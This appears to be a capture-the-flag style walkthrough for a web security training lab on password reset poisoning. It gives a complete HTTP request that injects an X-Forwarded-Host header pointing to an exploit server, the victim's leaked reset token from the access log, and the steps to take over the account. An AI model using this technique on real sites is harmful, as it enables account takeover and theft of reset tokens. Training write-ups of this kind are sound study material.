## Password reset poisoning via middleware

This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

## Notes

- Possibility to leave a comment on a post
- Exploit server
- /login
- Forgot password feature


## Resume

1. Capture a forgot-password request
2. Add the `X-Forwarded-Host:` header with exploit server
3. Change request username to **Carlos**
4. Retrieve **Carlos** reset token
5. Reset **Carlos** password and log in

## Solve 

Go to the password reset page and submit a request for your own account. You receive an email containing a reset link with a token.

Send the **POST /forgot-password** request to Repeater and observe that the application uses the `X-Forwarded-Host` header to generate the reset link.

Add the header and point it to your exploit server.


```
POST /forgot-password HTTP/2
Host: 0a6f00d504bd31e68133110000740006.web-security-academy.net
Cookie: session=0bTjPYhBRy3hjWuSsMJQaOzYchmJhrw5
Content-Length: 15
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0a6f00d504bd31e68133110000740006.web-security-academy.net

Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6f00d504bd31e68133110000740006.web-security-academy.net/forgot-password

Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Forwarded-Host: exploit-0a43005b0442319d819c106701d10081.exploit-server.net

username=carlos
```

Send the request. The reset link is now generated using your exploit server domain.

Go to the exploit server and check the access log. You can see a request containing the victim's reset token:

```
/forgot-password?temp-forgot-password-token=wlztp2colwj8mcp377lbljrpm83jzshs
```

Copy this token.

Go back to your email and open the legitimate reset link (the one pointing to the real application). Replace the `temp-forgot-password-token` value with the token you just captured.

Load the modified URL and set a new password for Carlos.

Login with the new credentials and access the account page.